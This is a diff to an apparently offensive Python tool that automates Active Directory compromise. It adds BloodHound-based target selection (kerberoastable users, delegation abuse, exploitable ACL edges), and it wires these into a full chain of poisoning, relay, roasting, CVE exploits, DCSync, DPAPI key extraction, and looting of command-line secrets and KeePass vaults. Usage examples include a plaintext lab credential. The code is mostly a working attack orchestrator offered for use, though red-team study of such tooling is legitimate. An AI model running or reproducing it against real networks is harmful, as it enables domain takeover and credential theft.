+        "enterprise_admins": [],
+        "schema_admins": [],
+        "kerberoastable": [],
+        "asreproastable": [],
+        "unconstrained_delegation": [],
+        "constrained_delegation": [],
+        "rbcd_inbound": [],
+        "laps_computers": [],
+        "admincount_users": [],
+        "disabled_admins": [],
+        "pwd_never_expires_admins": [],
+    }
+
+    # --- Users ---
+    for u in users:
+        props = u.get("Properties", {})
+        name = props.get("name", "?")
+        if props.get("hasspn") and "KRBTGT@" not in name.upper():
+            findings["kerberoastable"].append(name)
+        if props.get("dontreqpreauth"):
+            findings["asreproastable"].append(name)
+        if props.get("unconstraineddelegation"):
+            findings["unconstrained_delegation"].append(f"USER:{name}")
+        if props.get("admincount"):
+            findings["admincount_users"].append(name)
+            if not props.get("enabled", True):
+                findings["disabled_admins"].append(name)
+            if props.get("pwdneverexpires"):
+                findings["pwd_never_expires_admins"].append(name)
+
+    # --- Computers ---
+    for c in computers:
+        props = c.get("Properties", {})
+        name = props.get("name", "?")
+        if props.get("unconstraineddelegation"):
+            findings["unconstrained_delegation"].append(f"COMPUTER:{name}")
+        if props.get("haslaps"):
+            findings["laps_computers"].append(name)
+        atd = props.get("allowedtodelegate") or []
+        for spn in atd:
+            findings["constrained_delegation"].append(f"{name} → {spn}")
+        # Inbound RBCD: someone has been granted msDS-AllowedToActOnBehalfOfOtherIdentity
+        for ace in c.get("Aces", []):
+            if ace.get("RightName") == "AllowedToAct":
+                src = sid_to_name.get(ace.get("PrincipalSID", ""), ace.get("PrincipalSID", "?"))
+                findings["rbcd_inbound"].append(f"{src} → {name}")
+
+    # --- Groups: protected admin groups ---
+    protected = {
+        "DOMAIN ADMINS@": "domain_admins",
+        "ENTERPRISE ADMINS@": "enterprise_admins",
+        "SCHEMA ADMINS@": "schema_admins",
+    }
+    for g in groups:
+        gname = g.get("Properties", {}).get("name", "").upper()
+        for prefix, bucket in protected.items():
+            if gname.startswith(prefix):
+                for m in g.get("Members", []):
+                    member_name = sid_to_name.get(m.get("ObjectIdentifier", ""),
+                                                  m.get("ObjectIdentifier", "?"))
+                    findings[bucket].append(member_name)
+
+    # Dedupe while preserving order
+    for k, v in findings.items():
+        seen = set()
+        deduped = []
+        for item in v:
+            if item not in seen:
+                seen.add(item)
+                deduped.append(item)
+        findings[k] = deduped
+
+    # --- Actionable-edge analysis ---
+    # Build the principal closure: us + every group containing us (transitively).
+    # Edges scoped to a controlled principal mean WE can wield that ACE.
+    our_sid = _bh_find_our_sid(users, cfg)
+    if our_sid:
+        log.debug(f"BloodHound: our SID resolved to {our_sid}")
+    else:
+        log.debug("BloodHound: could not resolve our user SID — universal-group "
+                  "edges will still be evaluated")
+    controlled = _bh_controlled_principals(our_sid, groups)
+
+    actionable_edges: list[dict] = []
+    # Tag each object with its type so we know how to use the edge later
+    typed_objects = (
+        [(u, "User") for u in users]
+        + [(c, "Computer") for c in computers]
+        + [(g, "Group") for g in groups]
+    )
+    for obj, otype in typed_objects:
+        target_sid = obj.get("ObjectIdentifier", "")
+        target_name = obj.get("Properties", {}).get("name", "?")
+        for ace in obj.get("Aces", []):
+            right = ace.get("RightName", "")
+            psid = ace.get("PrincipalSID", "")
+            if right not in _BH_INTERESTING_RIGHTS:
+                continue
+            if psid not in controlled:
+                continue
+            actionable_edges.append({
+                "right": right,
+                "target_name": target_name,
+                "target_type": otype,
+                "target_sid": target_sid,
+                "principal_sid": psid,
+                "via": sid_to_name.get(psid, psid),
+            })
+
+    # --- Persist analysis ---
+    out_file = cfg.work_dir / "bloodhound-analysis.txt"
+    sections = [
+        ("domain_admins",            "👑 Domain Admins"),
+        ("enterprise_admins",        "👑 Enterprise Admins"),
+        ("schema_admins",            "👑 Schema Admins"),
+        ("kerberoastable",           "🎫 Kerberoastable users (hasspn=true)"),
+        ("asreproastable",           "🔓 AS-REP roastable users (dontreqpreauth=true)"),
+        ("unconstrained_delegation", "⚠️  Unconstrained delegation"),
+        ("constrained_delegation",   "⚠️  Constrained delegation (allowedtodelegate)"),
+        ("rbcd_inbound",             "🎟️  RBCD inbound (AllowedToAct)"),
+        ("laps_computers",           "🔐 LAPS-enabled computers"),
+        ("admincount_users",         "🛡️  AdminCount=1 users"),
+        ("disabled_admins",          "💤 Disabled admin accounts"),
+        ("pwd_never_expires_admins", "⏳ Admins with pwdneverexpires"),
+    ]
+    lines = [
+        "=" * 60,
+        f" BloodHound analysis — {cfg.domain}",
+        f" {len(users)} users / {len(computers)} computers / {len(groups)} groups",
+        "=" * 60,
+        "",
+    ]
+    for key, title in sections:
+        items = findings[key]
+        if not items:
+            continue
+        lines.append(f"{title} ({len(items)})")
+        for item in items[:100]:
+            lines.append(f"  - {item}")
+        if len(items) > 100:
+            lines.append(f"  ... +{len(items)-100} more")
+        lines.append("")
+
+    # Actionable edges section
+    if actionable_edges:
+        lines.append(f"⚡ Actionable edges from {cfg.username or 'us'} "
+                     f"({len(actionable_edges)})")
+        for e in actionable_edges[:200]:
+            via = f" (via {e['via']})" if e["via"] != cfg.username.upper() + "@" + cfg.domain.upper() else ""
+            lines.append(f"  - {e['right']:<25} → {e['target_type']}:{e['target_name']}{via}")
+        if len(actionable_edges) > 200:
+            lines.append(f"  ... +{len(actionable_edges)-200} more")
+        lines.append("")
+    out_file.write_text("\n".join(lines))
+
+    # --- Surface inline ---
+    if findings["domain_admins"]:
+        ok(f"🐶 Domain Admins: {len(findings['domain_admins'])}")
+        for da in findings["domain_admins"][:5]:
+            detail(da)
+    if findings["kerberoastable"]:
+        ok(f"🐶 Kerberoastable: {len(findings['kerberoastable'])} user(s)")
+        for u in findings["kerberoastable"][:3]:
+            detail(u)
+    if findings["asreproastable"]:
+        ok(f"🐶 AS-REP roastable: {len(findings['asreproastable'])} user(s)")
+        for u in findings["asreproastable"][:3]:
+            detail(u)
+    if findings["unconstrained_delegation"]:
+        ok(f"🐶 Unconstrained delegation: {len(findings['unconstrained_delegation'])}")
+        for h in findings["unconstrained_delegation"][:3]:
+            detail(h)
+    if findings["constrained_delegation"]:
+        ok(f"🐶 Constrained delegation: {len(findings['constrained_delegation'])} edge(s)")
+    if findings["rbcd_inbound"]:
+        ok(f"🐶 RBCD inbound: {len(findings['rbcd_inbound'])} edge(s)")
+    if findings["laps_computers"]:
+        ok(f"🐶 LAPS-readable candidates: {len(findings['laps_computers'])}")
+
+    detail(f"Full analysis: {out_file}")
+
+    # Feed AS-REP/Kerberoastable lists back to roast phase if files don't exist yet
+    asrep_hint = cfg.work_dir / "bloodhound-asrep-targets.txt"
+    if findings["asreproastable"] and not asrep_hint.exists():
+        asrep_hint.write_text("\n".join(findings["asreproastable"]) + "\n")
+    kerb_hint = cfg.work_dir / "bloodhound-kerberoast-targets.txt"
+    if findings["kerberoastable"] and not kerb_hint.exists():
+        kerb_hint.write_text("\n".join(findings["kerberoastable"]) + "\n")
+
+    # Surface actionable edges inline + write a separate file for the auto-action loop
+    if actionable_edges:
+        ok(f"🐶 Actionable edges from us: {len(actionable_edges)}")
+        for e in actionable_edges[:5]:
+            detail(f"{e['right']} → {e['target_type']}:{e['target_name']}")
+        actionable_file = cfg.work_dir / "bloodhound-actionable.txt"
+        actionable_file.write_text("\n".join(
+            f"{e['right']}\t{e['target_type']}\t{e['target_name']}\t"
+            f"via:{e['via']}" for e in actionable_edges
+        ) + "\n")
+        detail(f"Actionable edges: {actionable_file}")
+
+    return {"findings": findings, "actionable_edges": actionable_edges}
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # Full Auto: Zero-auth → ARP/WPAD/WSUS → Crack → Exploit → DCSync
@@ -5758,6 +7268,7 @@ def run_full_auto(cfg: Config):
     detail("0️⃣   Passive sniff — detect WPAD/WSUS/PXE/LLMNR/DHCPv6 traffic")
     detail("1-3  ARP spoof → WPAD poisoning → WSUS relay → PXE theft")
     detail("4️⃣   NTLM theft file drops (.library-ms/.theme on shares)")
+    detail("4.5  nxc enrichment + BloodHound -c All (graph analysis) 🐶")
     detail("5️⃣   Kerberoast + AS-REP Roast (credential harvest)")
     detail("6️⃣   AD CS — ESC1-17 detection (Certihound) / ESC1-16 exploit (certipy)")
     detail("7️⃣   SCCM NAA credential theft (sccmhunter)")
@@ -5876,6 +7387,10 @@ def run_full_auto(cfg: Config):
     # Step 4d: nxc enrichment battery (vuln checks + cred mining + recon)
     run_nxc_enrichment(cfg)
 
+    # Step 4e: BloodHound graph collection + automatic analysis
+    if not cfg.no_bloodhound:
+        run_bloodhound_collect(cfg)
+
     # Step 5: Kerberoast + AS-REP Roast (immediate credential harvest)
     if not cfg.no_roast:
         log.info("Running Kerberoast + AS-REP Roast for additional credentials...")
@@ -5908,6 +7423,12 @@ def run_full_auto(cfg: Config):
     if best_target:
         exploit_target(best_target, cfg)
 
+    # Step 8a: Ghost-SPN upgrade (CVE-2025-58726) — opportunistic Kerberos
+    # pivot when our relayed account has SPN-write rights on a target machine.
+    if best_target and not cfg.no_ghost_spn:
+        target_machine = best_target.split(".")[0] if "." in best_target else best_target
+        try_ghost_spn_upgrade(target_machine, cfg)
+
     # Step 8b: WebDAV coercion — bypass SMB signing via HTTP relay
     if not best_target or not relay_targets:
         webclient_hosts = detect_webclient_hosts(cfg)
@@ -5938,6 +7459,10 @@ def run_full_auto(cfg: Config):
     # Step 10b: DPAPI backup key extraction (post-DCSync goldmine)
     if not cfg.no_dpapi:
         run_dpapi_backup(cfg)
+
+    # Step 11: Loot — process cmdlines + KeePass on hosts we landed on
+    if not cfg.no_loot:
+        run_loot(cfg)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -6052,6 +7577,55 @@ def print_summary(cfg: Config):
     if dpapi_key.exists():
         stats.append(("🔐 DPAPI key:", f"{C.BOLD_YELLOW}backup key extracted{C.NC}"))
 
+    # nxc enrichment extracted creds (LAPS / userPassword / desc / timeroast)
+    enrich_creds = cfg.work_dir / "enrich-extracted-creds.txt"
+    if enrich_creds.exists():
+        n = len([l for l in enrich_creds.read_text().splitlines() if l.strip()])
+        if n:
+            stats.append(("📝 Enrich creds:", f"{C.BOLD_GREEN}{n} extracted{C.NC}"))
+    enrich_summary = cfg.work_dir / "enrich-summary.txt"
+    if enrich_summary.exists():
+        flags = [l.strip() for l in enrich_summary.read_text().splitlines() if l.strip()]
+        for flag in flags:
+            U = flag.upper()
+            if "VULNERABLE" in U or "PRIV-ESC" in U:
+                stats.append(("🔥 Vuln finding:", f"{C.BOLD_RED}{flag[:32]}{C.NC}"))
+            elif "BADSUCCESSOR" in U:
+                stats.append(("🔥 BadSuccessor:", f"{C.BOLD_YELLOW}{flag[:32]}{C.NC}"))
+            elif "MAQ-RBCD-VIABLE" in U:
+                stats.append(("🎫 MAQ:", f"{C.BOLD_YELLOW}{flag.split(':',1)[1].strip()[:32]}{C.NC}"))
+    enrich_timeroast_cracked = cfg.work_dir / "enrich-timeroast-cracked.txt"
+    if enrich_timeroast_cracked.exists() and enrich_timeroast_cracked.stat().st_size > 0:
+        n = len(enrich_timeroast_cracked.read_text().strip().splitlines())
+        stats.append(("⏰ Timeroast:", f"{C.BOLD_GREEN}{n} cracked{C.NC}"))
+
+    # BloodHound analysis
+    bh_analysis = cfg.work_dir / "bloodhound-analysis.txt"
+    if bh_analysis.exists():
+        bh_text = bh_analysis.read_text()
+        bh_findings = sum(1 for ln in bh_text.splitlines() if ln.startswith("  - "))
+        if bh_findings:
+            stats.append(("🐶 BloodHound:", f"{C.BOLD_GREEN}{bh_findings} findings{C.NC}"))
+    bh_actionable = cfg.work_dir / "bloodhound-actionable.txt"
+    if bh_actionable.exists():
+        ae_count = len([l for l in bh_actionable.read_text().splitlines() if l.strip()])
+        if ae_count:
+            stats.append(("⚡ BH actionable:", f"{C.BOLD_YELLOW}{ae_count} edge(s){C.NC}"))
+
+    # Loot results
+    cmdline_secrets = sum(
+        len(f.read_text().strip().splitlines())
+        for f in cfg.work_dir.glob("loot-secrets-*.txt") if f.exists()
+    )
+    if cmdline_secrets:
+        stats.append(("💰 Cmdline loot:", f"{C.BOLD_GREEN}{cmdline_secrets} secret(s){C.NC}"))
+    kdbx_cracked = sum(
+        1 for f in cfg.work_dir.glob("loot-*.kdbx.cracked")
+        if f.exists() and f.stat().st_size > 0
+    )
+    if kdbx_cracked:
+        stats.append(("💎 KeePass cracked:", f"{C.BOLD_GREEN}{kdbx_cracked} vault(s){C.NC}"))
+
     # WebDAV coercion
     webdav_relay = cfg.work_dir / "webdav-relay.txt"
     if webdav_relay.exists() and re.search(r"authenticated|SUCCEED",
@@ -6146,6 +7720,27 @@ def parse_args() -> Config:
 
           # AppLocker bypass via LOLBin on specific target
           %(prog)s -u jsmith -p 'P@ss' -T 10.0.0.100 --applocker --lolbin mshta --custom-cmd "whoami"
+
+          # Kerberos AP-REQ reflection via Unicode-SPN (Synacktiv 2026, bypasses CVE-2025-33073 patch)
+          %(prog)s -u jsmith -p 'P@ss' -T srv01.corp.local --phase kerb-reflect
+
+          # CVE-2026-24294 LPE — generates foothold script + relay listener
+          %(prog)s --phase reflect-tcpport --reflect-host 10.0.0.50 --reflect-port 12345
+
+          # CVE-2026-26128 LPE — Kerberos loopback via Unicode SPN
+          %(prog)s -u jsmith -p 'P@ss' --phase reflect-loopback --reflect-host srv01.corp.local
+
+          # Full chain with Unicode-SPN fallback when CVE-2025-33073 is patched
+          %(prog)s -u jsmith -p 'P@ss' --unicode-spn
+
+          # BloodHound collection + automatic high-value analysis
+          %(prog)s -u sunfyre -p 'BSno5DP4tjJ4jIu8is3B' -d dracarys.lab \\
+                   --dc-fqdn BALERION.dracarys.lab --dc-ip 192.168.56.10 --phase bloodhound
+
+          # KCD protocol-transition bypass: rewrite TGS sname (tgssub-style)
+          %(prog)s --phase tgs-rewrite \\
+                   --in-ccache /tmp/admin@HTTP_arrax.dracarys.lab.ccache \\
+                   --alt-spn HTTP/vhagar.dracarys.lab
         """),
     )
 
@@ -6211,8 +7806,22 @@ def parse_args() -> Config:
     adv.add_argument("--no-rbcd", action="store_true", help="Skip RBCD delegation abuse")
     adv.add_argument("--machine-account", default="", help="Pre-created machine account for RBCD")
     adv.add_argument("--machine-password", default="", help="Machine account password for RBCD")
+    adv.add_argument("--alt-spn", default="",
+                     help="Alternate SPN (service/host) — passes -altservice to "
+                          "impacket-getST and rewrites the issued TGS sname "
+                          "(tgssub-style KCD protocol-transition bypass)")
+    adv.add_argument("--in-ccache", default="",
+                     help="Input ccache for --phase tgs-rewrite")
     adv.add_argument("--no-dpapi", action="store_true",
                      help="Skip DPAPI backup key extraction after DCSync")
+    adv.add_argument("--no-bloodhound", action="store_true",
+                     help="Skip BloodHound -c All collection + automatic analysis")
+    adv.add_argument("--no-bh-auto-action", action="store_true",
+                     help="Disable opportunistic chains from BloodHound actionable edges "
+                          "(WriteSPN→ghost-SPN, AddKeyCredentialLink→shadow-creds, "
+                          "WriteAccountRestrictions→RBCD)")
+    adv.add_argument("--no-loot", action="store_true",
+                     help="Skip loot phase (process-cmdline harvest + KeePass discovery/crack)")
 
     disc = p.add_argument_group("Credential Discovery (zero-auth foothold)")
     disc.add_argument("--no-discover", action="store_true",
@@ -6222,10 +7831,24 @@ def parse_args() -> Config:
     disc.add_argument("--spray-password", default="",
                       help="Single password to spray across discovered users (lockout-aware: one attempt per user)")
 
+    refl = p.add_argument_group("Authentication-reflection bypass (Synacktiv 2026)")
+    refl.add_argument("--unicode-spn", action="store_true",
+                      help="Try Kerberos AP-REQ reflection via Unicode-SPN collision when NTLM methods fail")
+    refl.add_argument("--no-ghost-spn", action="store_true",
+                      help="Skip CVE-2025-58726 ghost-SPN upgrade after a successful relay")
+    refl.add_argument("--no-loopback-check", action="store_true",
+                      help="Skip Win11 24H2 / Server 2025 fingerprint during enum (LPE candidates)")
+    refl.add_argument("--reflect-host", default="",
+                      help="Foothold FQDN/IP for --phase reflect-tcpport / reflect-loopback")
+    refl.add_argument("--reflect-port", type=int, default=12345,
+                      help="High TCP port for SMB-on-tcpport (CVE-2026-24294, default: 12345)")
+
     run_opts = p.add_argument_group("Execution")
     run_opts.add_argument("--phase", default="full",
                           choices=["full", "enum", "exploit", "dcsync", "arp", "wpad", "wsus",
-                                   "pxe", "sniff", "adcs", "roast", "sccm", "enrich", "discover"],
+                                   "pxe", "sniff", "adcs", "roast", "sccm", "enrich", "discover",
+                                   "bloodhound", "tgs-rewrite", "loot",
+                                   "reflect-tcpport", "reflect-loopback", "kerb-reflect"],
                           help="Run a single phase")
     run_opts.add_argument("--dry-run", action="store_true", help="Print commands only")
     run_opts.add_argument("-v", "--verbose", action="store_true", help="Debug output")
@@ -6277,10 +7900,20 @@ def parse_args() -> Config:
         no_rbcd=args.no_rbcd,
         machine_account=args.machine_account,
         machine_password=args.machine_password,
+        alt_spn=args.alt_spn,
+        in_ccache=args.in_ccache,
         no_dpapi=args.no_dpapi,
+        no_bloodhound=args.no_bloodhound,
+        no_bh_auto_action=args.no_bh_auto_action,
+        no_loot=args.no_loot,
         no_discover=args.no_discover,
         users_file=args.users_file,
         spray_password=args.spray_password,
+        unicode_spn=args.unicode_spn,
+        no_ghost_spn=args.no_ghost_spn,
+        no_loopback_check=args.no_loopback_check,
+        reflect_host=args.reflect_host,
+        reflect_port=args.reflect_port,
         phase=args.phase,
         dry_run=args.dry_run,
         verbose=args.verbose,
@@ -6447,6 +8080,21 @@ def main():
                     sys.exit(1)
                 run_nxc_enrichment(cfg)
 
+            case "bloodhound":
+                if not cfg.has_creds:
+                    log.error("--phase bloodhound requires credentials (-u/-p)")
+                    sys.exit(1)
+                run_bloodhound_collect(cfg)
+
+            case "tgs-rewrite":
+                run_tgs_rewrite_phase(cfg)
+
+            case "loot":
+                if not cfg.has_creds:
+                    log.error("--phase loot requires credentials (-u/-p)")
+                    sys.exit(1)
+                run_loot(cfg)
+
             case "discover":
                 # Zero-auth: no -u/-p needed, but cfg.dc_ip + cfg.domain
                 # must be auto-discoverable from the network or supplied.
@@ -6456,7 +8104,37 @@ def main():
                     sys.exit(1)
                 run_credential_discovery(cfg)
 
+            case "reflect-tcpport":
+                run_reflect_tcpport(cfg)
+
+            case "reflect-loopback":
+                if not cfg.has_creds:
+                    log.error("--phase reflect-loopback needs creds for ADIDNS write")
+                    sys.exit(1)
+                run_reflect_loopback(cfg)
+
+            case "kerb-reflect":
+                if not cfg.has_creds:
+                    log.error("--phase kerb-reflect needs credentials")
+                    sys.exit(1)
+                tgt = cfg.specific_target or cfg.dc_fqdn
+                if not tgt:
+                    log.error("--phase kerb-reflect needs -T <target FQDN>")
+                    sys.exit(1)
+                run_kerberos_reflection(tgt, cfg)
+
             case "full":
+                # Post-auth recon: nxc enrichment battery
+                run_nxc_enrichment(cfg)
+
+                # BloodHound graph collection + auto-action chains
+                # (WriteSPN→ghost-SPN, AddKeyCredentialLink→shadow-creds,
+                # GenericAll→RBCD). Fires before legacy exploitation so the
+                # actionable edges have already been walked when we reach
+                # the relay/coerce phases.
+                if not cfg.no_bloodhound:
+                    run_bloodhound_collect(cfg)
+
                 # Run new authenticated attacks before exploitation
                 if not cfg.no_roast:
                     run_roast_attack(cfg)
@@ -6514,6 +8192,10 @@ def main():
                 # DPAPI extraction after DCSync
                 if not cfg.no_dpapi:
                     run_dpapi_backup(cfg)
+
+                # Loot — process cmdlines + KeePass on hosts we landed on
+                if not cfg.no_loot:
+                    run_loot(cfg)
 
         cleanup_dns_records(cfg)
         print_summary(cfg)
